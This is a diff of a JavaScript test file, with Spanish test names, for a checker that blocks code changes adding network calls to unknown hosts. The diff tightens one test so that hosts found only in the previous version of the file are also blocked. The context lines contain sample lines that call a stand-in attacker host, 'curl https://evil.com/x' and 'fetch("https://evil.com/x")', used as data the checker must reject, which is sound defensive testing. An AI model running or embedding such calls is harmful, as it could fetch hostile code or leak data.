@@ -102,8 +102,8 @@ describe("H-4: los hosts «conocidos» salen del código del archivo anterior, n
     bloquea("src/a.sh", "curl https://evil.com/x\n", "# https://evil.com\n");
     bloquea("src/a.js", 'fetch("https://evil.com/x");\n', "/* x */ // https://evil.com\n");
   });
-  test("un host que ya estaba en el código sigue siendo conocido", () => {
-    pasa("src/a.js", 'fetch("https://api.ajeno.net/v2");\n', 'fetch("https://api.ajeno.net/v1");\n');
-    pasa("src/a.js", 'fetch("https://api.ajeno.net/v2");\n', 'const base = "https://api.ajeno.net/v1";\n');
+  test("un host que ya estaba en el código del archivo previo TAMPOCO queda autorizado (revisión nº 2, C-1)", () => {
+    bloquea("src/a.js", 'fetch("https://api.ajeno.net/v2");\n', 'fetch("https://api.ajeno.net/v1");\n');
+    bloquea("src/a.js", 'fetch("https://api.ajeno.net/v2");\n', 'const base = "https://api.ajeno.net/v1";\n');
   });
 });
